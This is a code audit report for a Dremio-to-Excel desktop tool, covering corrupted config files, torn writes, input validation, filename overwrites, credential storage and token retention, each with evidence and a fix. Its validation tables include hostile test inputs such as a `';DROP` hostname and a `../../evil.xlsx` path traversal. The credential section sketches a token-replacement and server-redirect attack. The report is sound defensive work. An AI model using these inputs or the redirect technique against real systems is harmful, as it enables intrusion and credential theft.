### Status: FIXED (Tier 3)

`_coerce_config` and `_coerce_history` now validate the *shape* of what parsed,
not merely that it parsed. Config is forced to dict-of-dicts and history to
list-of-dicts; anything else is dropped. Well-formed sections survive alongside
malformed ones, so one bad section does not cost the user the rest of their
settings.

The silence is addressed too. `ConfigManager` runs before any widget exists, so
it collects complaints in `load_warnings` and `_create_log_panel` drains them
into the log panel at the first moment there is somewhere to show them.

Verified: **all 14 corruptions now survive startup, and all 14 are reported.**
Previously 10 of 14 were fatal before a window existed.
`repro_f21_malformed_json.py`: **NOT REPRODUCIBLE** — and its criterion was
tightened, so surviving silently would now still count as CONFIRMED.

Malformed history entries are **dropped, not migrated** — including the
`["SELECT 1"]` v1 shape. Guessing at the meaning of an unknown shape risks
putting the wrong text in front of someone about to run it as SQL. Migrating
that specific format is a small, separate decision if it is wanted.

**Why this is High rather than a curiosity.** The config failures occur in
`ConfigManager.__init__` → `_merge_with_defaults`, called from
`DremioExporter.__init__` at [app.py:54](../../dremio_Tool/app.py#L54) — **the
first statement of the constructor, before a single widget is created.** The
history failures occur in `get_history_labels`, reached from
`_update_history_dropdown` at [app.py:327](../../dremio_Tool/app.py#L327),
inside `_create_query_panel`, still during `__init__`.

In both cases the app dies with a traceback **and no window ever appears**. In a
PyInstaller windowed build there is no console either, so the symptom is: the
user double-clicks the icon and nothing happens, forever. Recovery requires
knowing to delete a JSON file from a hidden `%APPDATA%` folder that the
user-facing README never mentions.

**How a user reaches it:** the `["SELECT 1"]` row is the one to worry about — a
bare list of query strings is the obvious v1 history format, so any older build,
hand-edit, or third-party sync that wrote that shape bricks the current app.
Config-file sync tools (OneDrive, roaming profiles) writing a placeholder or a
conflict stub does the same.

---

### F-22 — Non-atomic writes; a torn write silently resets all settings · **Medium**

**Evidence: EXECUTED** *(was SOURCE)*

**Reproduced by:** `dremio_Tool/tests/repro_f22_torn_write.py`. Seven real
settings are persisted, then the write is interrupted at two points — after
truncation but before any content, and 40% through:

| Tear point | File after | Settings recovered on reopen |
|---|---|---|
| 0% (truncated, nothing written) | 0 bytes (was 633) | **1 of 7** |
| 40% (partial JSON) | 253 bytes (was 633) | **1 of 7** |

Lost in both cases: hostname, username, output directory, filename pattern,
window size, last query. `_load_json` swallowed it and the app came back looking
factory-fresh. A re-scan of the live source confirms no `os.replace`, no
`tempfile`, and no `fsync` anywhere in the application.

**File:** [config.py:165-177](../../dremio_Tool/config.py#L165-L177)

```python
with open(filepath, 'w', encoding='utf-8') as f:
    json.dump(data, f, indent=2, ensure_ascii=False)
```

`open(..., 'w')` truncates immediately, so there is a window in which the file
is empty or partial. No temp-file-plus-`os.replace`, no `fsync`, no backup copy.

This window is not theoretical: `_save_json` is called from `_on_close`
([app.py:506](../../dremio_Tool/app.py#L506)) **immediately before**
`root.destroy()`, and from `add_to_history` on every Execute. A machine
shutdown, a force-quit, or a full disk during that window truncates the file.

The result lands in the *survivable* column of F-21 — which is the problem:
`_load_json` swallows it, returns defaults, and the app opens looking factory-
fresh. Hostname, username, output folder, filename pattern, window size, and
last query are all gone, and the only notice is a `print()` to a console that
does not exist (F-20).

---

### Status: FIXED (Tier 5)

`_save_json` writes a sibling temp file, `fsync`s it, and renames it over the
target, so a reader sees either the whole old file or the whole new one. Both
tear points now leave **7 of 7** settings intact. Credential writes go through
the same path with `private=True`, since the temp file is the inode the rename
installs and it has to be `0o600` from the moment it exists.

> **This repro is why the stash check is mandatory.** It grepped for the
> machinery it was checking — and the fix's own comment names `os.replace` and
> `fsync`, so the grep reported the fix present *before it existed*. It now
> tears a real write and reads the file back.

Verified: `repro_f22_torn_write.py`: **NOT REPRODUCIBLE**.

## Input validation

### F-23 — `clean_hostname` mangles ordinary inputs · **Medium**

**Evidence: EXECUTED**

**File:** [utils.py:317-337](../../dremio_Tool/utils.py#L317-L337)

Executed against the real function:

| Input | Output | |
|---|---|---|
| `dremio.example.com` | `dremio.example.com` | ok |
| `https://dremio.example.com/` | `dremio.example.com` | ok |
| `HTTPS://Dremio.Example.com` | **`HTTPS`** | ⚠ |
| `https://` | **`''`** | ⚠ |
| `dremio.example.com/api/v3` | `dremio.example.com/api/v3` | ⚠ path kept |
| `::1` | **`''`** | ⚠ |
| `[::1]:32010` | **`'['`** | ⚠ |
| `http://a//b` | `a//b` | ⚠ |

Three distinct defects:

1. **Case-sensitive scheme stripping.** `.replace('https://', '')` misses
   `HTTPS://`. The `:` split then keeps everything before the first colon, so
   the hostname becomes the literal string `HTTPS`. A user who pastes a URL from
   a browser address bar that displays the scheme in caps, or who simply types
   it that way, gets a connection attempt to a host named `HTTPS` and a DNS
   error that names a host they never entered.
2. **IPv6 is entirely unsupported.** The unconditional `split(':')[0]` destroys
   any IPv6 literal.
3. **Paths are not stripped.** `rstrip('/')` removes only trailing slashes, so
   `host/api/v3` survives into the Flight URI.

---

### Status: FIXED (Tier 5)

`clean_hostname` strips any scheme case-insensitively, drops path, query and
fragment, and brackets IPv6 literals as a URI requires — checking for a real
address rather than counting colons, so `a:b:c` is not dressed up as one.

`connection.py` held a third copy of these rules and does **not** get a fourth:
cleaning belongs to the caller, and duplicating rules is how they drift.
Importing `utils` would be the other way to share them, but `utils` pulls in
tkinter for its asset loaders and `connection.py` is deliberately UI-agnostic —
so it *checks* rather than transforms, and a wrong value fails plainly instead of
being quietly turned into a different wrong value.

Verified: `repro_f24_validation_bypass.py`: **NOT REPRODUCIBLE** — all 9 cleaning
cases correct.

### F-24 — Validation accepts hostnames and ports that cannot connect · **Medium**

**Evidence: EXECUTED** *(was EXECUTED + SOURCE)*

**Reproduced by:** `dremio_Tool/tests/repro_f24_validation_bypass.py`. The
"validated value is not the used value" half is no longer reasoned — the URI the
real `connect()` builds is now captured through its own `on_status` callback,
which reports it before any socket work:

| hostname | port | validation | URI actually built |
|---|---|---|---|
| `dremio.example.com` | `'  32010  '` | VALID | `grpc+tls://dremio.example.com:  32010  ` |
| `dremio.example.com` | `'+32010'` | VALID | `grpc+tls://dremio.example.com:+32010` |
| `https://` | `'32010'` | VALID | `grpc+tls://:32010` |

**File:** [utils.py:282-314](../../dremio_Tool/utils.py#L282-L314)

Executed:

| hostname | port | `validate_connection_params` |
|---|---|---|
| `not a hostname!!` | `32010` | **valid** |
| `http://` | `32010` | **valid** → cleans to `''` |
| `';DROP` | `32010` | **valid** |
| `x` | `'  32010  '` | **valid** |
| `x` | `'１２３４'` (fullwidth) | **valid** |
| `x` | `'+32010'` | **valid** |

The hostname is checked **only for non-emptiness** — no character-set check, no
length check, no `idna` encode. Combined with F-23, `https://` passes validation
and then cleans to the empty string, producing the URI `grpc+tls://:32010`.

The port has a subtler bug: validation parses it with `int(port)`, but
[app.py:629](../../dremio_Tool/app.py#L629) passes the **raw string** through to
[connection.py:250](../../dremio_Tool/connection.py#L250), which interpolates it
directly:

```python
location = f"{scheme}://{hostname}:{port}"
```

So `'  32010  '` validates as 32010 and then builds
`grpc+tls://host:  32010  `. `int()` also accepts Unicode decimal digits and a
leading `+`, neither of which survives URI parsing. **The validated value and
the used value are different objects** — the classic shape of a validation
bypass.

---

### Status: FIXED (Tier 5)

The sharper half was that **the validated value and the used value were different
objects**. `validate_connection_params` parsed the port with `int()` and
`_connect` then handed the raw string to `connection.py`, which interpolated it
into the URI — so `'  32010  '` validated as `32010` and built
`grpc+tls://host:  32010  `. `int()` also accepts Unicode decimal digits and a
leading sign, so `'１２３４'` and `'+32010'` validated and neither survives URI
parsing. Hostname had the same split, which is how `'https://'` passed validation
and produced `grpc+tls://:32010`.

`validate_connection_params` now **returns the canonical `{hostname, port}` it
validated**, and callers use those. The URI is built from what was checked by
construction rather than by discipline.

Verified: `repro_f24_validation_bypass.py`: **NOT REPRODUCIBLE**, observing the
URI through `connect()`'s own `on_status` callback before any socket work rather
than inferring it.

> The repro's malformed-URI check searched the whole string for `:` and `+`. The
> scheme is `grpc+tls`, so it called every URI malformed and reported the fix
> broken while the URIs were all correct.

### F-25 — Filename pattern without `{timestamp}` silently overwrites prior exports · **High**

**Evidence: EXECUTED**

**File:** [utils.py:260-275](../../dremio_Tool/utils.py#L260-L275),
[app.py:751-752](../../dremio_Tool/app.py#L751-L752)

`generate_timestamp_filename` is a plain `str.replace`. Executed:

| Pattern | Result |
|---|---|
| `dremio_export_{timestamp}.xlsx` | `dremio_export_20260818_032804.xlsx` |
| `report.xlsx` | `report.xlsx` — **same name every time** |
| `{TIMESTAMP}.xlsx` | `{TIMESTAMP}.xlsx` — case-sensitive, no substitution |
| `noext` | `noext` — no extension enforced |
| `''` | `''` → `Path(dir) / ''` is **the directory itself** |
| `../../evil.xlsx` | traverses out of the chosen output folder |

The Filename field is a free-text `ttk.Entry`
([app.py:293](../../dremio_Tool/app.py#L293)) with no validation whatsoever.

**Reproduced by:** `dremio_Tool/tests/repro_f25_filename_overwrite.py`, which
runs two real exports to `report.xlsx` and shows the destruction directly:
export 1 wrote `{'extract': 'morning', 'rows': 111}`, export 2 resolved to the
same path and left only `{'extract': 'afternoon', 'rows': 222}` — one file in
the folder, no prompt, a normal success dialog both times.

**How a user reaches it:** typing `report.xlsx` — the single most natural thing
to type — makes every subsequent export **silently overwrite** the previous one.
`pd.ExcelWriter` opens in write mode with no existence check and no prompt, and
the success dialog reports a normal export. A user running a morning and an
afternoon extract into `report.xlsx` loses the morning's data with no warning at
any point.

`''` produces `IsADirectoryError` (verified), caught by the generic handler and
shown as a raw errno dialog. `{TIMESTAMP}` failing to substitute is the same
class of case-sensitivity bug as F-23.

> **Correction (Stage 0) — that errno dialog usually does not appear.** Measured
> over 5 trials of the real `''` path: **1/5**. See **F-33**. Note this affects
> only the `''` edge case; the finding's *main* consequence — the silent
> overwrite from typing `report.xlsx` — never produced a dialog to begin with,
> since nothing raises. F-33 does not change that half.

---

### Status: FIXED (Tier 5)

`utils.validate_output_filename` rejects empty values, paths and characters
Windows forbids, and normalises a missing extension to `.xlsx` rather than
rejecting it — openpyxl writes nothing else, so appending is never wrong.

The overwrite prompt has to live in `_execute_and_export`, on the Tk thread: the
worker cannot ask the user anything. The resolved path is then handed to
`_snapshot_export_settings` rather than resolved a second time, **so the file
that was checked is the file that gets written** — re-resolving would re-stamp
`{timestamp}` and could name a different file.

Verified: `repro_f25_filename_overwrite.py`: **NOT REPRODUCIBLE**, driving the
prompt both ways; answering No leaves the original file intact.

## Boundary bugs of the same shape as the column-letter issue

The F-01 defect is *an index arithmetic expression that is correct on the first
one or two ranges and then walks off the end of a character set*. Two others of
the same family:

### F-26 — `truncate_string` produces output longer than `max_length` · **Low**

**Evidence: EXECUTED**

**File:** [utils.py:243-257](../../dremio_Tool/utils.py#L243-L257)

```python
return text[:max_length - len(suffix)] + suffix
```

When `max_length < len(suffix)` the slice bound goes negative and slices from
the *end*, so the function returns a string **longer** than the limit it was
asked to enforce. Executed on `"abcdefghij"`:

| `max_length` | result | length |
|---|---|---|
| 5 | `'ab...'` | 5 ✓ |
| 3 | `'...'` | 3 ✓ |
| **2** | `'abcdefghi...'` | **12** ✗ |
| **0** | `'abcdefg...'` | **10** ✗ |

Identical shape to F-01: correct for the first range, silently wrong past a
boundary, no error raised. **Currently latent** — the function has no callers
(F-27), and `config.py:247` reimplements the same logic inline rather than
calling it. It is a trap for whoever wires it up.

### Status: FIXED (Tier 5)

The negative slice bound is gone; a `max_length` below the suffix length now
truncates plainly instead of slicing from the end, and `max_length <= 0` returns
`''`. `max_length == len(suffix)` deliberately still returns the bare suffix:
that case was already inside the bound and the audit verified it, and fixing the
broken range is not licence to change the range that worked.

Latent — the function has no callers — so this defuses a trap rather than
repairing live damage.

> **The repro checks ~700 combinations rather than replaying the audit's four
> rows, and that is what earned its keep:** those four rows pass against several
> wrong implementations. Asserting the bound across the whole range is also what
> caught `build_query_label` reintroducing this exact bug one file over —
> `collapsed[-tail:]` with `tail == 0` returns the whole string, not the empty
> one.

Verified: `repro_f26_truncate_string.py`: **NOT REPRODUCIBLE**.

### F-27 — History labels collide, making the dropdown ambiguous · **Low**

**Evidence: EXECUTED + SOURCE**

**Files:** [config.py:247](../../dremio_Tool/config.py#L247),
[config.py:271](../../dremio_Tool/config.py#L271)

The label is `query[:50] + '...'`, so any two queries sharing a 50-character
prefix produce **byte-identical** dropdown entries. Executed with two real
queries differing only in a `WHERE` clause:

```
['SELECT a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t FRO...',
 'SELECT a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t FRO...']
identical: True
```

Wide `SELECT` lists — the app's whole purpose — collide almost always, since the
distinguishing `WHERE`/`FROM` clause sits past character 50.

To be precise about the mechanism: this is **not** a lookup bug.
`_load_from_history` uses `history_combo.current()`, and Tk stores the selected
*index*, returning it correctly even when the display strings are duplicates. The
defect is that the **user** cannot tell the entries apart and has no way to pick
the right one except by trial. Also note `get_history_labels` re-truncates to
`[:60]` while the stored label is already capped at 53 — the second bound is
dead.

**Reproduced by:** `dremio_Tool/tests/repro_f27_history_labels.py`. **Evidence
upgraded to EXECUTED** — the Tk-semantics claim above was the SOURCE half, and it
is now run rather than reasoned: with two byte-identical values in a real
`ttk.Combobox`, selecting index 0 and index 1 each returned that same index from
`current()` and retrieved the correct query. The audit's reasoning was right, and
the fix should target the label, not the lookup. Stored labels measured at 53
characters, confirming the `[:60]` bound is unreachable.

---

### Status: FIXED (Tier 5)

Labels collapse whitespace and elide the **middle**, keeping both ends, which
puts the distinguishing trailing clause back on screen. A wide `SELECT` list is
this app's purpose, so a prefix throws away exactly what tells two queries apart.

Three things this had to survive beyond "the two labels differ" — a bar a fix can
clear while only *moving* the collision:

- **Queries differing only in the elided middle.** Elision cannot separate those,
  so they fall back to a timestamp, then to an ordinal — because two queries
  added in the same second share a timestamp, which is precisely what happens
  when they are pasted in quick succession. The first attempt used the timestamp
  alone and put the collision straight back.
- **A legacy `history.json`**, whose stored labels are already-collided prefixes.
  That is where the defect actually lives for an existing user, so labels are
  rebuilt from the query on read rather than trusted.
- **Whether the widget can show what differs.** It could not: the combobox was 40
  characters and the labels 60, clipping them at exactly the point that
  distinguishes two entries — two identical strings on screen *after* the strings
  themselves had been fixed. The marker now goes at the front and the combobox
  width is tied to the label bound so the two cannot drift apart again.

Verified: `repro_f27_history_labels.py`: **NOT REPRODUCIBLE**, checking what is
*displayed* rather than what the string contains.

## Credential handling

### F-28 — The PAT is written world-readable in reversible form · **Critical**

**Evidence: EXECUTED + STATIC**

**File:** [config.py:379-393](../../dremio_Tool/config.py#L379-L393)

Executed end-to-end against a real `ConfigManager`:

```
raw contents  = {"alice": "c3VwZXItc2VjcmV0LVBBVC12YWx1ZQ=="}
decoded token = 'super-secret-PAT-value'
```

**Permissions — corrected measurement.** An earlier draft of this finding quoted
`0o646` / app-dir `0o756` as if the app produced them. It does not. Re-measured
under explicitly set umasks, with a plain `open()` control file created in the
same directory under the same umask:

| Location | umask | `.credentials` | app dir | plain-`open()` control |
|---|---|---|---|---|
| `/tmp` | 022 | `0o646` `-rw-r--rw-` | `0o756` | **`0o646`** |
| `/tmp` | 077 | `0o646` `-rw-r--rw-` | `0o756` | **`0o646`** |
| repo workspace | 022 | `0o666` `-rw-rw-rw-` | `0o777` | **`0o666`** |

The control file matches `.credentials` exactly in every row, and the mode does
not change between umask 022 and 077. **This container does not honour umask**
— the numbers are an artifact of the dev-container filesystem, not of
application behaviour, and `0o646` is indeed unreachable from umask 022 (which
would give `0o644`). They are recorded here only as the evidence that disproves
the earlier claim.

**What is actually true**, and does not depend on this environment:

1. **No permission hardening — `grep` for `chmod`, `0o600`, `S_IRUSR` across the
   whole application returns nothing** (STATIC; this is the load-bearing fact).
   `_save_token_to_file` uses a bare `open(path, 'w')`, so the file takes the
   default `0o666` masked by whatever umask the process happens to inherit. The
   app makes **no assertion at all** about who may read or write its credential
   store; it delegates that entirely to ambient policy. Derived outcomes:
   - umask 022 (standard Linux default) → `0o644`, **world-readable**
   - umask 002 (common on corporate Linux without user-private groups) →
     `0o664`, **group-writable**
   - this container → `0o646`/`0o666`, **world-writable**

2. **World-writable means replacement, not just disclosure.** Wherever the
   umask permits group or world write — demonstrated reachable above — an
   attacker is not limited to reading the PAT. They can **overwrite
   `.credentials` with a token of their choosing**, and the app will
   authenticate with it on the next launch without any integrity check.
   `config.json` sits in the same directory, is written by the same unhardened
   `_save_json`, and holds `hostname` — so the same write primitive lets an
   attacker point the client at a server they control *and* supply the
   credential it presents. `INVENTORY.md` §5.6 notes TLS verification is
   silently disabled when the named CA is absent, which removes the transport's
   objection to being redirected. Queries and their results then flow to the
   attacker's host.

   The fix is `os.open(path, os.O_WRONLY|os.O_CREAT|os.O_TRUNC, 0o600)` — using
   `os.chmod` after the fact leaves a window in which the file exists at the
   permissive mode — applied to the containing directory as well.

3. **Base64 is encoding, not encryption.** The code says so honestly at
   [config.py:387](../../dremio_Tool/config.py#L387) — but `README.md:94`
   advertises the file as "Encrypted token storage". A user reading the README
   makes a materially wrong trust decision about where their Dremio PAT lives.
   This is the documentation drift noted in `INVENTORY.md` §5.7, restated here
   because it has a security consequence rather than a cosmetic one.

This path is **not hypothetical in this environment**: keyring resolves to
`keyring.backends.fail.Keyring`, so every keyring call raises, the broad
handlers swallow it, and storage falls through to exactly this file — with the
only notice being a `print()` nobody sees (F-20).

### Status: permissions FIXED (Tier 1); reversible encoding OPEN

`ConfigManager._open_private` now creates `.credentials` with
`os.open(..., 0o600)` — not `open()` followed by `chmod`, which would leave a
window where the file exists at the permissive default. The app-data directory
is created and forced to `0o700`, which covers `config.json` and its `hostname`
value, closing the redirect half of the attack.

> **The `os.chmod` after `os.open` is deliberate, and is not the post-hoc
> pattern this fix was meant to avoid.** `os.open`'s mode argument applies only
> when the file is *created*; it does nothing to a file that already exists, and
> `O_TRUNC` does not change permissions. Measured:
>
> | Step | Mode |
> |---|---|
> | file left by an older version | `0o644` |
> | after `os.open(..., 0o600)` with `O_TRUNC` | **`0o644`** — unchanged |
> | after explicit `os.chmod(0o600)` | `0o600` |
>
> So `os.open` alone would harden new installs while leaving **every upgraded
> install world-readable indefinitely**. `os.open` handles first creation with
> no exposure window; `chmod` handles the migration. Both are needed.

Verified by the **differential** against the plain-`open()` control, which is
the only criterion that means anything on a filesystem that ignores umask:

| | umask 022 | umask 077 |
|---|---|---|
| `.credentials` | **`0o600`** `-rw-------` | **`0o600`** `-rw-------` |
| app dir | **`0o700`** | **`0o700`** |
| plain-`open()` control | `0o646` | `0o646` |

The control still shows `0o646`, so the filesystem still ignores umask — and
`.credentials` no longer matches it. That difference *is* the proof: the mode is
now the application's own assertion rather than ambient policy.

`README.md` corrected: `.credentials` is no longer described as "Encrypted token
storage", and the Security section now states plainly that base64 is reversible,
what the file mode does and does not buy, and when to prefer the OS credential
store.

**Still open — tracked as `F-28 (encoding)`, which stays CONFIRMED.** Permission
hardening does not make base64 into encryption. Anyone who *can* read the file —
root, a backup, a synced home directory — recovers the PAT in full. Closing that
means replacing the fallback, not adjusting it, and is out of Tier 1 scope.

**Reproduced by:** `dremio_Tool/tests/repro_f28_credentials.py`, which now emits
two verdicts so the two halves can diverge. Stage 0 originally confirmed every
element: the raw file contents
(`{"alice": "c3VwZXItc2VjcmV0LVBBVC12YWx1ZQ=="}`), the round-trip back to
`'super-secret-PAT-value'`, the absence of any `chmod`/`0o600`/`S_IRUSR`/`os.open`
in the whole application, and — critically — **the control experiment**: the
plain-`open()` control file matched `.credentials` at `0o646` in every row, and
the mode did not change between umask 022 and 077. The script keeps that control
permanently, so the caveat cannot be lost when the Tier 1 fix is written.

---

### F-29 — Unchecking "Remember token" never deletes the stored token · **High**

**Evidence: EXECUTED** *(was SOURCE)*

**Reproduced by:** `dremio_Tool/tests/repro_f29_remember_token.py`, which walks
the exact three-step sequence below against a real app and a real
`ConfigManager`:

```
1. remember_token=True, save   -> .credentials exists, token retrievable
2. uncheck the box, save       -> token still retrievable
3. save again (as _on_close)   -> {"alice": "c3VwZXItc2VjcmV0LVBBVC12YWx1ZQ=="}
   then clear the field and fire _on_username_change
                               -> field REPOPULATED from storage
```

`delete_token` confirmed to have no caller anywhere in the UI.

**Files:** [app.py:487-491](../../dremio_Tool/app.py#L487-L491),
[app.py:495-502](../../dremio_Tool/app.py#L495-L502)

```python
if self.remember_token.get():
    ...
    self.config.save_token(username, token)
# no else branch
```

### Status: FIXED (Tier 2)

Added the missing `elif username:` branch calling `self.config.delete_token()`.
Verified: after unchecking and saving, `.credentials` contains `{}`, the token
is no longer retrievable, and `_on_username_change` no longer repopulates the
masked field. `repro_f29_remember_token.py`: **NOT REPRODUCIBLE**.

**New module edge, for the diagram:** `app.py._save_current_settings` →
`config.ConfigManager.delete_token`. This is a *real call* edge (bucket (a)) on
an existing import, and it retires one of F-31's dead definitions.

Side effect worth noting: `README.md:115` advises "Uncheck 'Remember token' on
shared computers". That advice was false until this fix and is now accurate.

`_save_current_settings` writes the token when the box is checked and does
**nothing at all** when it is unchecked. `ConfigManager.delete_token` exists
([config.py:342](../../dremio_Tool/config.py#L342)) and is **never called from
anywhere** (proven dead, F-30).

So the sequence a security-conscious user would actually perform —

1. connect with "Remember token" checked (the default,
   [app.py:245](../../dremio_Tool/app.py#L245)); the PAT is written to
   `.credentials`
2. later, uncheck the box to stop storing it
3. close the app

— leaves the PAT on disk, unchanged. Worse, `_on_username_change`
([app.py:495](../../dremio_Tool/app.py#L495)) reads it straight back out of
storage and repopulates the masked field on the next launch, so the UI actively
suggests the credential was retained on purpose. **The only control the UI
offers for forgetting a credential does not forget it**, and there is no other
way to remove it short of hand-deleting a hidden file.

---

### F-30 — Token lifetime in memory is unbounded · **Medium**

**Evidence: EXECUTED** *(was SOURCE)*

**Reproduced by:** `dremio_Tool/tests/repro_f30_token_lifetime.py`, using a real
`_connect` / `_connect_thread` against a local Flight server so the middleware
and bearer token are genuinely populated:

```
after connect      Entry: STILL HOLDS THE PAT
                   bearer_token:            (b'authorization', b'Bearer ...')
                   middleware.call_credential: [b'authorization', b'Bearer ...']
after disconnect   bearer_token: None    middleware: None
                   Entry: STILL HOLDS THE PAT
```

**The logging claim is confirmed too**, which matters because "Save Log" writes
the panel to a user-chosen file: across 10 log lines the PAT did **not** appear.
The exposure is storage and retention, not logging — as stated.

The PAT is held in at least four places for the life of the process:

| Location | Lifetime |
|---|---|
| `self.conn_fields['token']` `ttk.Entry` | until the window closes — never cleared after a successful connect |
| `_connect_thread(… token)` frame | until the thread ends; **retained indefinitely if an exception's traceback survives** |
| `self.middleware.call_credential` ([connection.py:107](../../dremio_Tool/connection.py#L107)) | the derived bearer token, until `disconnect()` |
| `self.bearer_token` ([connection.py:266](../../dremio_Tool/connection.py#L266)) | until `disconnect()` |

`disconnect()` does clear the last two by rebinding to `None`, which is the
right instinct. Nothing clears the Entry or re-reads it from a short-lived
buffer.

**On the logging question specifically:** the token is **not** written to the
log panel or to `print()` on any path examined — the `_log(f"ERROR: {str(e)}")`
handlers at [app.py:672](../../dremio_Tool/app.py#L672) and
[app.py:735](../../dremio_Tool/app.py#L735) relay exception text from
`authenticate_basic_token`, which does not echo credentials. The exposure is
storage (F-28) and retention, not logging. Worth stating explicitly, since
"Save Log" writes that panel to a user-chosen file.

---

### Status: FIXED (Tier 5)

The frames first, because that part is invisible. `token` is a parameter of
`_connect_thread` and of `connection.connect`, so it lives in a frame — and **a
frame outlives its call whenever an exception carries it away**: the traceback
holds the frame, the frame holds its locals, and the PAT stays reachable for as
long as anything holds that exception. Rebinding the parameter in a `finally`
empties the slot on every path including the one that raises.

Measured before being relied on: a control run shows the unfixed frame still
reading `token='<the PAT>'` where the fixed one reads `None`. Also checked, since
it would have been a fifth hiding place: CPython deletes `Thread._args` after
`run()` completes.

The entry is cleared after a successful connect **only when "Remember token" is
off**, and that condition is the honest part. With it on, the PAT is deliberately
written to disk, so wiping the widget would be theatre — it is one file read
away and the user asked for exactly that.

Verified: `repro_f30_token_lifetime.py`: **NOT REPRODUCIBLE**. It measures
retention by scanning every live `app.py` / `connection.py` frame via `gc`, and
separately holds a failed connect's exception — what a handler that logs a
traceback, or a debugger, would do.

## Dead code (proven, not inferred)

### F-31 — Twelve definitions and five config keys have no reference anywhere · **Low**

**Evidence: STATIC**

Proven by an executed AST sweep over all six modules: collect every
`FunctionDef` and upper-case module constant, collect every `Name` load,
`Attribute` access, import alias, and string literal, and subtract.

| Definition | Site |
|---|---|
| `get_asset_path` | [utils.py:37](../../dremio_Tool/utils.py#L37) |
| `list_assets` | [utils.py:163](../../dremio_Tool/utils.py#L163) |
| `truncate_string` | [utils.py:243](../../dremio_Tool/utils.py#L243) |
| `reset_config` | [config.py:187](../../dremio_Tool/config.py#L187) |
| `clear_history` | [config.py:259](../../dremio_Tool/config.py#L259) |
| `delete_token` | [config.py:342](../../dremio_Tool/config.py#L342) |
| `get_saved_queries` | [config.py:416](../../dremio_Tool/config.py#L416) |
| `save_query_file` | [config.py:425](../../dremio_Tool/config.py#L425) |
| `load_query_file` | [config.py:445](../../dremio_Tool/config.py#L445) |
| `delete_query_file` | [config.py:458](../../dremio_Tool/config.py#L458) |
| `connection_string` | [connection.py:379](../../dremio_Tool/connection.py#L379) |
| `ASSETS_FOLDER` | [constants.py:135](../../dremio_Tool/constants.py#L135) |

**12 definitions** (11 callables + 1 constant), plus **5 `DEFAULT_CONFIG` keys**
written to `config.json` on every save and never read back: `sheet_name`,
`include_timestamp`, `apply_table_format`, `table_style`, `auth_method` — grep
confirms each appears only at its `constants.py` definition. **17 unreferenced
items in total.**

**Two sweep hits that are NOT dead**, recorded so the list is not misread:
`received_headers` ([connection.py:48](../../dremio_Tool/connection.py#L48)) and
`start_call` ([connection.py:88](../../dremio_Tool/connection.py#L88)) have no
in-repo caller because **pyarrow's Flight machinery invokes them** as
`ClientMiddleware` hooks. `INVENTORY.md` §3 documents the auth flow that depends
on them. Deleting them would break authentication entirely.

Likewise `keyring` is **not** dead: it is a live conditional import used at
[config.py:309](../../dremio_Tool/config.py#L309),
[config.py:334](../../dremio_Tool/config.py#L334), and
[config.py:355](../../dremio_Tool/config.py#L355).

The `delete_token` and saved-queries entries matter beyond hygiene: they are the
missing halves of F-29 and of the unreachable saved-queries subsystem
(`INVENTORY.md` §5.5) — working implementations that were never wired to the UI.

---

### Status: FIXED (Tier 4 decision — rewire, not delete)

The decision recorded here was taken: the UI now calls `config.py`'s four
`saved_queries/` methods. Save asks for a **name** and files the query in
`saved_queries/`; the Load button became **Library**, listing the collection with
Open and Delete. The directory the app has always created is finally the thing it
is for.

Browse is kept deliberately. Opening a `.sql` file from anywhere was a documented
capability, and removing it to tidy the code up would be a regression dressed as
a fix — so it lives inside the library dialog and still goes through F-18's
encoding detection.

> **Wiring a subsystem up makes its edges reachable for the first time**, which
> is the lesson F-07 taught about sheet names. The name sanitiser was written
> when nothing called it, and had three defects: a name of only illegal
> characters reduced to `''`, producing the hidden file `.sql`; `..` survived
> intact, producing `...sql`; and trailing spaces survived, so `report ` and
> `report` were two different queries that look identical in a list. All three
> are now refused or normalised.

Verified: `repro_f31_saved_queries.py`: **NOT REPRODUCIBLE** — all four config
methods have UI callers. Against a pre-fix build it reports **0 of 4**.

## Dependency pinning

### F-32 — Every requirement floor is unbounded · **Medium**

**Evidence: EXECUTED + SOURCE**

**File:** [requirements.txt](../../dremio_Tool/requirements.txt)

```
pandas>=1.5.0    pyarrow>=10.0.0    openpyxl>=3.0.0    Pillow>=9.0.0    keyring>=23.0.0
```

No upper bounds, no lockfile, no `pyproject.toml`, no CI. A fresh install today
resolves to pandas **3.0.5** and pyarrow **25.0.1** — both major versions beyond
the floors, across documented breaking changes (pandas 2.0's Arrow-backed dtypes
and 3.0's copy-on-write and string-dtype defaults; pyarrow's
`FlightStreamReader` API churn).

The audit environment demonstrates the drift concretely: reading the corrupt
workbook from F-11 raised `OptionError: No such keys(s): 'io.excel.zip.reader'`
— a pandas 3.0 internal path that did not exist at the 1.5.0 floor. Two
developers installing from this file months apart get materially different
runtimes, and the app has no test suite to detect it.

---

### Status: FIXED (Tier 5 — pulled forward)

Exact `==` pins rather than ranges. This is an application, not a library:
nothing depends on it, so there is no downstream resolver to leave room for, and
reproducibility is worth more than flexibility. The file records how to move a
pin — change it, re-run `run_all.py`, check the summary is unchanged.

**Why this went first:** this repo's evidence *is* its test suite. Verdicts about
openpyxl's row ceiling, pyarrow's `FlightStreamReader` surface and pandas' dtype
handling only mean something alongside the versions that produced them, and an
unbounded floor lets those change with no line of the repo changing.

Verified: `repro_f32_unpinned_requirements.py`: **NOT REPRODUCIBLE** — all 6
requirements pinned exactly and every one matches what is installed.

> The second check is the one with ongoing value: **it is a drift detector for
> the rest of the suite.** Upgrade a dependency without re-running the repros and
> it says so, marking every other verdict stale.

## Found during Stage 0

### F-33 — Error dialogs raise `NameError` instead of displaying · **High**

**Evidence: EXECUTED + STATIC**

**Files:** [app.py:671-675](../../dremio_Tool/app.py#L671-L675) (`_connect_thread`),
[app.py:734-737](../../dremio_Tool/app.py#L734-L737) (`_execute_thread`)

**Reproduced by:** `dremio_Tool/tests/repro_f33_error_dialog_nameerror.py`

Not found by the original audit. It surfaced while reproducing F-14: the
disconnect race fired exactly as predicted, but the error dialog F-14 says the
user is shown never appeared.

```python
except Exception as e:                                        # app.py:734
    self.root.after(0, lambda: self._log(f"ERROR: {str(e)}"))
    self.root.after(0, lambda: self.progress_label.config(text="Error"))
    self.root.after(0, lambda: messagebox.showerror("Error", str(e)))
```

Python deletes the name `e` when the `except` block ends — specified behaviour,
to break the exception's reference cycle. The lambdas capture `e` as a free
variable and run *later*, when the event loop dispatches them. By then the name
is unbound:

```
NameError: cannot access free variable 'e' where it is not associated
           with a value in enclosing scope
```

